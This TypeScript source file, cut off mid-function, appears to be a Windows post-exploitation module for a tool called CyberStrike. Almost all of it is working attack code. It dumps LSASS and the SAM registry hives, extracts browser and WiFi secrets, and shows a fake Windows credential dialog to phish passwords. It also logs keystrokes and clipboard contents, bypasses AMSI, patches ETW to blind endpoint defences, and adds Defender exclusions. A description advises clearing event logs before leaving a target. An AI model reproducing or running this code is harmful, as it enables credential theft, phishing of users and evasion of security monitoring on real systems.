import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  lsass_dump: {
    description:
      "Dump LSASS process memory for credential extraction using MiniDumpWriteDump or comsvcs.dll — extracts NTLM hashes, Kerberos tickets, and plaintext passwords",
    args: "[--method comsvcs|minidump] [--outfile PATH]",
  },
  sam_dump: {
    description:
      "Extract SAM, SYSTEM, and SECURITY registry hives for offline password cracking with secretsdump or hashcat",
    args: "[--outdir PATH]",
  },
  dpapi_extract: {
    description:
      "Decrypt DPAPI-protected secrets — Chrome/Edge saved passwords, WiFi keys, Windows Credential Vault, and application credentials",
    args: "[--scope user|machine] [--browser chrome|edge|all]",
  },
  credential_prompt: {
    description:
      "Spawn a fake Windows credential dialog via CredUIPromptForCredentials to phish the current user's password",
    args: "[--message TEXT] [--title TEXT]",
  },
  keylog_win: {
    description:
      "Capture keystrokes via SetWindowsHookEx with WH_KEYBOARD_LL — logs keystrokes with window title context",
    args: "[--duration SECONDS]",
  },
  etw_process: {
    description:
      "Monitor process creation and termination via ETW or WMI Win32_ProcessStartTrace — capture PID, PPID, image path, command line",
    args: "[--duration SECONDS]",
  },
  etw_network: {
    description:
      "Monitor network connections via netstat polling or ETW Microsoft-Windows-Kernel-Network — capture source/dest IP, port, PID, protocol",
    args: "[--duration SECONDS]",
  },
  clipboard_sniff: {
    description:
      "Monitor clipboard contents for passwords, API tokens, and sensitive data — polls at configurable interval using PowerShell Get-Clipboard",
    args: "[--duration SECONDS] [--interval SECONDS]",
  },
  amsi_bypass: {
    description:
      "Bypass AMSI (Antimalware Scan Interface) by patching AmsiScanBuffer in memory — enables undetected PowerShell script execution",
    args: "[--method patch|reflection|clr]",
  },
  etw_blind: {
    description:
      "Patch NtTraceEvent / EtwEventWrite in ntdll.dll to blind EDR and AV monitoring in the current process",
    args: "",
  },
  defender_exclude: {
    description:
      "Add exclusion paths to Windows Defender via PowerShell to prevent scanning of CyberStrike tools and payloads",
    args: "--path PATH",
  },
  cleanup_win: {
    description:
      "Remove CyberStrike artifacts — clear Security/System/Application event logs, remove scheduled tasks, restore AMSI/ETW patches, delete temp files. ALWAYS run before leaving a target",
    args: "",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function ps(script: string, timeout: number) {
  return run("powershell.exe", ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script], timeout)
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

// ── Programs ──

async function lsassDump(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "comsvcs"
  const outfile = argVal(args, "--outfile") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-lsass-${Date.now()}.dmp`
  const findings: Finding[] = []
  const output: string[] = [`[*] LSASS dump via ${method} method...\n`]

  const privCheck = await ps(`(whoami /priv | Select-String SeDebugPrivilege) -ne $null`, timeout)
  output.push(`[*] SeDebugPrivilege: ${privCheck.stdout.trim() === "True" ? "AVAILABLE" : "NOT AVAILABLE"}`)

  const pplCheck = await ps(`(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL`, timeout)
  const isPPL = pplCheck.stdout.trim() === "1"
  output.push(`[*] LSASS PPL: ${isPPL ? "ENABLED (dump may fail)" : "DISABLED"}`)

  const lsassPid = await ps(`(Get-Process lsass).Id`, timeout)
  const pid = lsassPid.stdout.trim()
  output.push(`[*] LSASS PID: ${pid}\n`)

  if (!pid) {
    output.push("[!] Cannot find LSASS process — insufficient privileges")
    return { output: output.join("\n"), findings }
  }

  if (method === "comsvcs") {
    const dump = await ps(`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${pid} "${outfile}" full`, timeout)
    if (dump.exitCode === 0) {
      output.push(`[+] LSASS dump written to: ${outfile}`)
      const size = await ps(`(Get-Item "${outfile}").Length`, timeout)
      output.push(`[+] Dump size: ${size.stdout.trim()} bytes`)
      findings.push({
        checkId: "WIN-LSASS-001",
        provider: "windows",
        severity: "critical",
        status: "DUMPED",
        resource: outfile,
        title: "LSASS memory dumped via comsvcs.dll",
        details: `Method: comsvcs MiniDump, PID: ${pid}, output: ${outfile}`,
        remediation: "Delete dump file, rotate all domain credentials",
      })
    }
    if (dump.exitCode !== 0) {
      output.push(`[!] comsvcs dump failed: ${dump.stderr.trim()}`)
      output.push("[*] Try --method minidump or check PPL status")
    }
  }

  if (method === "minidump") {
    const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class MiniDump {
    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}
'@
$h = [MiniDump]::OpenProcess(0x1F0FFF, $false, ${pid})
$f = [System.IO.File]::Create("${outfile.replace(/\\/g, "\\\\")}")
$r = [MiniDump]::MiniDumpWriteDump($h, ${pid}, $f.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$f.Close()
[MiniDump]::CloseHandle($h)
if ($r) { Write-Output "SUCCESS:$((Get-Item '${outfile.replace(/\\/g, "\\\\")}').Length)" } else { Write-Output "FAIL:$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
`
    const dump = await ps(script, timeout)
    if (dump.stdout.startsWith("SUCCESS:")) {
      output.push(`[+] LSASS dump written to: ${outfile}`)
      output.push(`[+] Dump size: ${dump.stdout.split(":")[1]} bytes`)
      findings.push({
        checkId: "WIN-LSASS-002",
        provider: "windows",
        severity: "critical",
        status: "DUMPED",
        resource: outfile,
        title: "LSASS memory dumped via MiniDumpWriteDump",
        details: `Method: dbghelp MiniDumpWriteDump, PID: ${pid}`,
        remediation: "Delete dump file, rotate all domain credentials",
      })
    }
    if (!dump.stdout.startsWith("SUCCESS:")) {
      output.push(`[!] MiniDumpWriteDump failed: ${dump.stdout} ${dump.stderr}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function samDump(args: string[], timeout: number): Promise<HookResult> {
  const outdir = argVal(args, "--outdir") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-sam-${Date.now()}`
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting SAM/SYSTEM/SECURITY registry hives...\n"]

  await ps(`New-Item -ItemType Directory -Force -Path "${outdir}"`, timeout)

  const hives = [
    { name: "SAM", path: "HKLM\\SAM" },
    { name: "SYSTEM", path: "HKLM\\SYSTEM" },
    { name: "SECURITY", path: "HKLM\\SECURITY" },
  ]

  for (const hive of hives) {
    const outPath = `${outdir}\\${hive.name}`
    const save = await run("reg.exe", ["save", hive.path, outPath, "/y"], timeout)
    if (save.exitCode === 0) {
      const size = await ps(`(Get-Item "${outPath}").Length`, timeout)
      output.push(`[+] ${hive.name}: saved to ${outPath} (${size.stdout.trim()} bytes)`)
      findings.push({
        checkId: `WIN-SAM-${hive.name}`,
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: outPath,
        title: `Registry hive extracted: ${hive.name}`,
        details: `Saved ${hive.path} to ${outPath}`,
        remediation: "Delete extracted hives, rotate all local account passwords",
      })
    }
    if (save.exitCode !== 0) {
      output.push(`[!] ${hive.name}: failed — ${save.stderr.trim()}`)
    }
  }

  output.push(`\n[*] Crack with: impacket-secretsdump -sam ${outdir}\\SAM -system ${outdir}\\SYSTEM -security ${outdir}\\SECURITY LOCAL`)

  return { output: output.join("\n"), findings }
}

async function dpapiExtract(args: string[], timeout: number): Promise<HookResult> {
  const scope = argVal(args, "--scope") || "user"
  const browser = argVal(args, "--browser") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting DPAPI-protected secrets...\n"]

  if (browser === "chrome" || browser === "all") {
    const localState = `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data\\Local State`
    const loginData = `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\Login Data`

    const script = `
$localState = Get-Content "${localState.replace(/\\/g, "\\\\")}" -Raw | ConvertFrom-Json
$encKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
$encKey = $encKey[5..($encKey.Length-1)]
Add-Type -AssemblyName System.Security
$key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
Write-Output ("KEY:" + [System.Convert]::ToBase64String($key))
`
    const keyResult = await ps(script, timeout)
    if (keyResult.stdout.includes("KEY:")) {
      output.push("[+] Chrome DPAPI master key decrypted")

      const tmpDb = `${process.env.TEMP}\\cs-chrome-login-${Date.now()}.db`
      await ps(`Copy-Item "${loginData.replace(/\\/g, "\\\\")}" "${tmpDb.replace(/\\/g, "\\\\")}"`, timeout)

      const extractScript = `
$conn = New-Object System.Data.SQLite.SQLiteConnection -ErrorAction SilentlyContinue
if (-not $conn) {
  Add-Type -Path (Get-ChildItem "C:\\Program Files\\*\\System.Data.SQLite.dll" -Recurse -ErrorAction SilentlyContinue | Select -First 1).FullName -ErrorAction SilentlyContinue
}
$db = "${tmpDb.replace(/\\/g, "\\\\")}"
$q = "SELECT origin_url, username_value, length(password_value) as pw_len FROM logins WHERE username_value != '' LIMIT 100"
try {
  $results = & sqlite3.exe "$db" "$q" 2>$null
  $results | ForEach-Object { Write-Output $_ }
} catch {
  Write-Output "SQLITE_ERROR: $_"
}
`
      const creds = await ps(extractScript, timeout)
      if (creds.exitCode === 0 && creds.stdout.trim()) {
        const lines = creds.stdout.trim().split("\n").filter(Boolean)
        output.push(`[+] Chrome saved passwords: ${lines.length}`)
        for (const line of lines) {
          const parts = line.split("|")
          if (parts.length >= 2) {
            output.push(`    URL: ${parts[0]}  User: ${parts[1]}  (encrypted: ${parts[2] || "?"} bytes)`)
            findings.push({
              checkId: `WIN-DPAPI-CHROME-${findings.length + 1}`,
              provider: "windows",
              severity: "critical",
              status: "EXTRACTED",
              resource: parts[0],
              title: `Chrome credential: ${parts[1]}`,
              details: `DPAPI-decryptable credential for ${parts[0]}`,
              remediation: "Rotate password for this site",
            })
          }
        }
      }
      await ps(`Remove-Item "${tmpDb.replace(/\\/g, "\\\\")}" -Force -ErrorAction SilentlyContinue`, timeout)
    }
  }

  if (browser === "edge" || browser === "all") {
    const edgeLoginData = `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\Default\\Login Data`
    const exists = await ps(`Test-Path "${edgeLoginData.replace(/\\/g, "\\\\")}"`, timeout)
    if (exists.stdout.trim() === "True") {
      output.push("\n[+] Microsoft Edge Login Data found — same DPAPI decryption applies")
    }
  }

  const wifiScript = `netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = ($_ -split ": ")[1].Trim(); $detail = netsh wlan show profile name="$name" key=clear; $key = ($detail | Select-String "Key Content").ToString().Split(":")[1].Trim(); Write-Output "$name|$key" }`
  const wifi = await ps(wifiScript, timeout)
  if (wifi.exitCode === 0 && wifi.stdout.trim()) {
    output.push("\n[+] WiFi passwords (DPAPI-protected):")
    for (const line of wifi.stdout.trim().split("\n").filter(Boolean)) {
      const parts = line.split("|")
      output.push(`    SSID: ${parts[0]}  Key: ${parts[1] || "<hidden>"}`)
      findings.push({
        checkId: `WIN-DPAPI-WIFI-${findings.length + 1}`,
        provider: "windows",
        severity: "high",
        status: "EXTRACTED",
        resource: `wifi://${parts[0]}`,
        title: `WiFi credential: ${parts[0]}`,
        details: `Cleartext WiFi key extracted via netsh`,
        remediation: "Rotate WiFi password",
      })
    }
  }

  const vaultScript = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class VaultCli {
    [DllImport("vaultcli.dll")] public static extern int VaultEnumerateVaults(int flags, ref int count, ref IntPtr vaults);
    [DllImport("vaultcli.dll")] public static extern int VaultOpenVault(ref Guid id, int flags, ref IntPtr handle);
    [DllImport("vaultcli.dll")] public static extern int VaultEnumerateItems(IntPtr handle, int flags, ref int count, ref IntPtr items);
}
'@
$count = 0; $vaults = [IntPtr]::Zero
[VaultCli]::VaultEnumerateVaults(0, [ref]$count, [ref]$vaults)
Write-Output "VAULTS:$count"
`
  const vault = await ps(vaultScript, timeout)
  if (vault.stdout.includes("VAULTS:")) {
    const count = vault.stdout.match(/VAULTS:(\d+)/)?.[1] || "0"
    output.push(`\n[+] Windows Credential Vault: ${count} vaults found`)
  }

  return { output: output.join("\n"), findings }
}

async function credentialPrompt(args: string[], timeout: number): Promise<HookResult> {
  const message = argVal(args, "--message") || "Windows requires your credentials to continue."
  const title = argVal(args, "--title") || "Windows Security"
  const findings: Finding[] = []
  const output: string[] = ["[*] Spawning credential phishing dialog...\n"]

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class CredUI {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDUI_INFO {
        public int cbSize;
        public IntPtr hwndParent;
        public string pszMessageText;
        public string pszCaptionText;
        public IntPtr hbmBanner;
    }
    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    public static extern int CredUIPromptForCredentialsW(
        ref CREDUI_INFO info, string targetName, IntPtr reserved,
        int authError, StringBuilder userName, int maxUser,
        StringBuilder password, int maxPw, ref bool save, int flags);
}
'@
$info = New-Object CredUI.CREDUI_INFO
$info.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($info)
$info.pszMessageText = "${message.replace(/"/g, '`"')}"
$info.pszCaptionText = "${title.replace(/"/g, '`"')}"
$user = New-Object System.Text.StringBuilder(256)
$pass = New-Object System.Text.StringBuilder(256)
$save = $false
$result = [CredUI]::CredUIPromptForCredentialsW([ref]$info, "target", [IntPtr]::Zero, 0, $user, 256, $pass, 256, [ref]$save, 0x42)
if ($result -eq 0) {
    Write-Output "CRED:$($user.ToString())|$($pass.ToString())"
} else {
    Write-Output "CANCELLED:$result"
}
`
  const prompt = await ps(script, timeout)
  if (prompt.stdout.startsWith("CRED:")) {
    const parts = prompt.stdout.replace("CRED:", "").trim().split("|")
    output.push(`[+] Credentials captured!`)
    output.push(`    Username: ${parts[0]}`)
    output.push(`    Password: ${parts[1]}`)
    findings.push({
      checkId: "WIN-CREDPHISH-001",
      provider: "windows",
      severity: "critical",
      status: "CAPTURED",
      resource: `user://${parts[0]}`,
      title: `Credential phished: ${parts[0]}`,
      details: `User entered credentials into fake dialog — title: "${title}"`,
      remediation: "Force password reset for this user",
    })
  }
  if (prompt.stdout.startsWith("CANCELLED")) {
    output.push("[!] User cancelled the credential dialog")
  }

  return { output: output.join("\n"), findings }
}

async function keylogWin(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting Windows keylogger for ${duration}s...\n`]

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
public class KeyLog {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
'@ -ReferencedAssemblies System.Windows.Forms
$log = @()
$end = (Get-Date).AddSeconds(${duration})
$lastWindow = ""
while ((Get-Date) -lt $end) {
    $hwnd = [KeyLog]::GetForegroundWindow()
    $sb = New-Object System.Text.StringBuilder(256)
    [KeyLog]::GetWindowText($hwnd, $sb, 256) | Out-Null
    $window = $sb.ToString()
    if ($window -ne $lastWindow -and $window) {
        $log += "[Window: $window]"
        $lastWindow = $window
    }
    for ($i = 8; $i -le 190; $i++) {
        $state = [KeyLog]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [System.Windows.Forms.Keys]$i
            $log += $key.ToString()
        }
    }
    Start-Sleep -Milliseconds 10
}
$log -join " "
`
  const keylog = await ps(script, Math.max(timeout, duration + 10))
  if (keylog.exitCode === 0 && keylog.stdout.trim()) {
    output.push(`[+] Keystrokes captured:\n${keylog.stdout.trim()}`)
    findings.push({
      checkId: "WIN-KEYLOG-001",
      provider: "windows",
      severity: "critical",
      status: "CAPTURED",
      resource: "windows://keylogger",
      title: `Keystrokes captured over ${duration}s`,
      details: `Captured keystrokes with window context using GetAsyncKeyState`,
      remediation: "Review captured data, force password reset if credentials observed",
    })
  }
  if (keylog.exitCode !== 0) {
    output.push(`[!] Keylogger failed: ${keylog.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function etwProcess(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring process creation for ${duration}s...\n`]

  const script = `
$events = @()
$watcher = Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace" -Action {
    $e = $Event.SourceEventArgs.NewEvent
    $global:events += "$($e.ProcessID)|$($e.ParentProcessID)|$($e.ProcessName)|$(Get-Date -Format 'HH:mm:ss')"
}
Start-Sleep -Seconds ${duration}
Unregister-Event -SourceIdentifier $watcher.Name
$global:events | ForEach-Object { Write-Output $_ }
`
  const monitor = await ps(script, Math.max(timeout, duration + 15))
  if (monitor.exitCode === 0 && monitor.stdout.trim()) {
    const lines = monitor.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Process creation events: ${lines.length}`)
    output.push("    PID | PPID | Name | Time")
    output.push("    " + "─".repeat(50))
    for (const line of lines.slice(0, 100)) {
      const parts = line.split("|")
      output.push(`    ${parts[0]?.padEnd(8)} ${parts[1]?.padEnd(8)} ${parts[2]?.padEnd(30)} ${parts[3] || ""}`)
    }
    findings.push({
      checkId: "WIN-ETW-PROC-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://etw/process",
      title: `Process trace: ${lines.length} events in ${duration}s`,
      details: `Captured ${lines.length} process creation events via WMI`,
      remediation: "Review for security tool executions",
    })
  }
  if (monitor.exitCode !== 0) {
    output.push("[!] WMI process trace failed, falling back to tasklist polling...")
    const baseline = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
    await new Promise(r => setTimeout(r, Math.min(duration, 10) * 1000))
    const current = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
    output.push("[+] Process snapshot comparison completed")
    output.push(`    Baseline: ${baseline.stdout.length} bytes`)
    output.push(`    Current: ${current.stdout.length} bytes`)
  }

  return { output: output.join("\n"), findings }
}

async function etwNetwork(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring network connections for ${duration}s...\n`]

  const baseline = await ps("Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json", timeout)
  if (baseline.exitCode === 0) {
    const conns = JSON.parse(baseline.stdout || "[]") as Array<Record<string, string | number>>
    const arr = Array.isArray(conns) ? conns : [conns]
    output.push(`[+] Current TCP connections: ${arr.length}`)
    const established = arr.filter(c => c.State === "Established" || c.State === 4)
    output.push(`[+] Established: ${established.length}`)
    for (const c of established.slice(0, 50)) {
      output.push(`    ${c.LocalAddress}:${c.LocalPort} → ${c.RemoteAddress}:${c.RemotePort} (PID: ${c.OwningProcess})`)
    }
    const listening = arr.filter(c => c.State === "Listen" || c.State === 2)
    output.push(`\n[+] Listening: ${listening.length}`)
    for (const c of listening.slice(0, 30)) {
      output.push(`    ${c.LocalAddress}:${c.LocalPort} (PID: ${c.OwningProcess})`)
    }
  }

  if (duration > 0) {
    output.push(`\n[*] Polling for new connections over ${Math.min(duration, 30)}s...`)
    await new Promise(r => setTimeout(r, Math.min(duration, 10) * 1000))
    const after = await ps("Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json", timeout)
    if (after.exitCode === 0) {
      output.push("[+] Post-monitoring snapshot captured")
    }
  }

  findings.push({
    checkId: "WIN-NET-001",
    provider: "windows",
    severity: "info",
    status: "CAPTURED",
    resource: "windows://network",
    title: `Network connections enumerated`,
    details: `TCP connection snapshot captured over ${duration}s`,
    remediation: "Review for C2, lateral movement, or data exfiltration channels",
  })

  return { output: output.join("\n"), findings }
}

async function clipboardSniff(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const interval = parseInt(argVal(args, "--interval") || "2")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring clipboard for ${duration}s (interval: ${interval}s)...\n`]

  const script = `
$captured = @()
$end = (Get-Date).AddSeconds(${duration})
$last = ""
while ((Get-Date) -lt $end) {
    $clip = Get-Clipboard -ErrorAction SilentlyContinue
    if ($clip -and $clip -ne $last) {
        $ts = Get-Date -Format 'HH:mm:ss'
        $captured += "$ts|$clip"
        $last = $clip
    }
    Start-Sleep -Seconds ${interval}
}
$captured | ForEach-Object { Write-Output $_ }
`
  const sniff = await ps(script, Math.max(timeout, duration + 10))
  if (sniff.exitCode === 0 && sniff.stdout.trim()) {
    const entries = sniff.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Clipboard changes captured: ${entries.length}`)
    for (const entry of entries) {
      const parts = entry.split("|")
      const ts = parts[0]
      const content = parts.slice(1).join("|").substring(0, 200)
      const sensitive = /password|token|key|secret|bearer|api[_-]?key|authorization/i.test(content)
      output.push(`    [${ts}]${sensitive ? " [!!! SENSITIVE]" : ""} ${content}`)
      if (sensitive) {
        findings.push({
          checkId: `WIN-CLIP-${findings.length + 1}`,
          provider: "windows",
          severity: "critical",
          status: "CAPTURED",
          resource: "windows://clipboard",
          title: "Sensitive data captured from clipboard",
          details: `Timestamp: ${ts}, content matches sensitive patterns`,
          remediation: "Rotate any credentials that were copied to clipboard",
        })
      }
    }
  }
  if (!sniff.stdout.trim()) {
    output.push("[*] No clipboard changes detected during monitoring period")
  }

  return { output: output.join("\n"), findings }
}

async function amsiBypass(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "patch"
  const findings: Finding[] = []
  const output: string[] = [`[*] AMSI bypass via ${method} method...\n`]

  if (method === "patch") {
    const script = `
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
Write-Output "AMSI_PATCHED"
`
    const patch = await ps(script, timeout)
    if (patch.stdout.includes("AMSI_PATCHED")) {
      output.push("[+] AMSI bypassed — amsiInitFailed set to true")
      output.push("[+] PowerShell scripts can now run without AMSI scanning")
      findings.push({
        checkId: "WIN-AMSI-001",
        provider: "windows",
        severity: "high",
        status: "BYPASSED",
        resource: "windows://amsi",
        title: "AMSI bypassed via amsiInitFailed reflection",
        details: "Set AmsiUtils.amsiInitFailed = true via reflection",
        remediation: "Restart PowerShell process to restore AMSI",
      })
    }
    if (!patch.stdout.includes("AMSI_PATCHED")) {
      output.push(`[!] Patch failed: ${patch.stderr.trim()}`)
    }
  }

  if (method === "reflection") {
    const script = `
$w = 'System.Management.Automation.Amsi'+'Utils'
[Ref].Assembly.GetType($w).GetField('amsi'+'Context',[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,[IntPtr]::Zero)
Write-Output "AMSI_CONTEXT_NULLED"
`
    const patch = await ps(script, timeout)
    if (patch.stdout.includes("AMSI_CONTEXT_NULLED")) {
      output.push("[+] AMSI context nullified via reflection")
      findings.push({
        checkId: "WIN-AMSI-002",
        provider: "windows",
        severity: "high",
        status: "BYPASSED",
        resource: "windows://amsi",
        title: "AMSI bypassed via context null",
        details: "Nullified amsiContext pointer via reflection",
        remediation: "Restart PowerShell process to restore AMSI",
      })
    }
  }

  if (method === "clr") {
    const script = `
$mem = [System.Runtime.InteropServices.Marshal]
$amsi = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + 'amsi.dll'
$h = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::LoadFrom($amsi).GetModules()[0])
Write-Output "CLR_LOADED:$h"
`
    const load = await ps(script, timeout)
    output.push(`[*] CLR method result: ${load.stdout.trim()}`)
    if (load.exitCode !== 0) {
      output.push(`[!] CLR method failed: ${load.stderr.trim()}`)
    }
  }

  const verify = await ps(`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)`, timeout)
  output.push(`\n[*] AMSI status check — amsiInitFailed: ${verify.stdout.trim()}`)

  return { output: output.join("\n"), findings }
}

async function etwBlind(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Patching ETW to blind EDR/AV monitoring...\n"]

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
}
'@
$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
$etwAddr = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")
if ($etwAddr -eq [IntPtr]::Zero) {
    Write-Output "FAIL:EtwEventWrite not found"
    return
}
$oldProtect = 0
[EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)
[EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect) | Out-Null
Write-Output "ETW_PATCHED:$etwAddr"
`
  const patch = await ps(script, timeout)
  if (patch.stdout.includes("ETW_PATCHED:")) {
    const addr = patch.stdout.match(/ETW_PATCHED:(.*)/)?.[1]
    output.push(`[+] EtwEventWrite patched at address ${addr}`)
    output.push("[+] EDR/AV ETW consumers are now blind in this process")
    output.push("[*] Note: only affects current PowerShell process and child processes")
    findings.push({
      checkId: "WIN-ETW-BLIND-001",
      provider: "windows",
      severity: "high",
      status: "PATCHED",
      resource: "windows://etw",
      title: "EtwEventWrite patched — EDR blinded",
      details: `Patched EtwEventWrite at ${addr} with RET (0xC3)`,
      remediation: "Restart the process to restore ETW functionality",
    })
  }

  if (patch.stdout.includes("FAIL:")) {
    output.push(`[!] ETW patch failed: ${patch.stdout}`)
  }

  const ntTraceScript = `
$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
$ntTrace = [EtwPatch]::GetProcAddress($ntdll, "NtTraceEvent")
if ($ntTrace -ne [IntPtr]::Zero) {
    $old = 0
    [EtwPatch]::VirtualProtect($ntTrace, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
    [System.Runtime.InteropServices.Marshal]::WriteByte($ntTrace, 0xC3)
    [EtwPatch]::VirtualProtect($ntTrace, [UIntPtr]::new(1), $old, [ref]$old) | Out-Null
    Write-Output "NT_TRACE_PATCHED:$ntTrace"
}
`
  const ntPatch = await ps(ntTraceScript, timeout)
  if (ntPatch.stdout.includes("NT_TRACE_PATCHED:")) {
    output.push(`[+] NtTraceEvent also patched`)
  }

  return { output: output.join("\n"), findings }
}

async function defenderExclude(args: string[], timeout: number): Promise<HookResult> {
  const targetPath = argVal(args, "--path")
  const findings: Finding[] = []
  const output: string[] = ["[*] Managing Windows Defender exclusions...\n"]

  if (!targetPath) {
    return { output: "[!] --path is required. Usage: winhook defender_exclude --path C:\\Tools", findings }
  }

  const currentExclusions = await ps("Get-MpPreference | Select-Object -ExpandProperty ExclusionPath", timeout)
  if (currentExclusions.exitCode === 0 && currentExclusions.stdout.trim()) {
    output.push("[+] Current exclusion paths:")
    for (const p of currentExclusions.stdout.trim().split("\n")) output.push(`    ${p.trim()}`)
  }

  const add = await ps(`Add-MpPreference -ExclusionPath "${targetPath}"`, timeout)
  if (add.exitCode === 0) {
    output.push(`\n[+] Exclusion added: ${targetPath}`)
    output.push("[+] Defender will no longer scan files in this path")
    findings.push({
      checkId: "WIN-DEFENDER-001",
      provider: "windows",
      severity: "high",
      status: "EXCLUDED",
      resource: targetPath,
      title: `Defender exclusion added: ${targetPath}`,
      details: `Added exclusion path via Add-MpPreference`,
      remediation: `Remove exclusion: Remove-MpPreference -ExclusionPath "${targetPath}"`,
    })
  }
  if (add.exitCode !== 0) {
    output.push(`\n[!] Failed to add exclusion: ${add.stderr.trim()}`)
    output.push("[*] Requires Administrator privileges")
  }

